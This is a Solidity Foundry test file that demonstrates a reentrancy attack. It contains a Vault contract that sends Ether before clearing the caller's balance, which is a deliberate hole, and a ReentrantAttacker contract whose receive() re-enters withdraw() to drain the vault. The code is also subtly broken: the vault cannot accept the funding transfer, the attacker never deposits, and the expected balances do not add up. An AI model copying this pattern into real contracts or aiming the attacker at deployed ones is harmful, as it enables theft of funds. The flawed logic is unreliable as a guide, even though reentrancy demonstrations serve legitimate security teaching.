// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

contract Vault {
    mapping(address => uint) balances;
    
    function withdraw() public {
        uint amt = balances[msg.sender];
        (bool s,) = msg.sender.call{value: amt}("");
        balances[msg.sender] = 0;
    }
}

contract ReentrancyExploit is Test {
    Vault vault;

    function setUp() public {
        vault = new Vault();
    }

    function testReentrancyAttack() public {
        // Fund the contract with some Ether
        payable(address(vault)).transfer(1 ether);
        
        // Deploy the attacker contract
        ReentrantAttacker attacker = new ReentrantAttacker(payable(address(vault)));
        
        // Call the attack function
        attacker.attack{value: 0.5 ether}();
        
        // Assert that the attacker has drained all funds from the vault
        assertEq(address(attacker).balance, 1 ether);
        assertEq(address(vault).balance, 0);
    }
}

contract ReentrantAttacker {
    Vault target;

    constructor(address _target) {
        target = Vault(_target);
    }

    receive() external payable {
        if (address(target).balance > 0) {
            target.withdraw();
        }
    }

    function attack() public payable {
        target.withdraw();
    }
}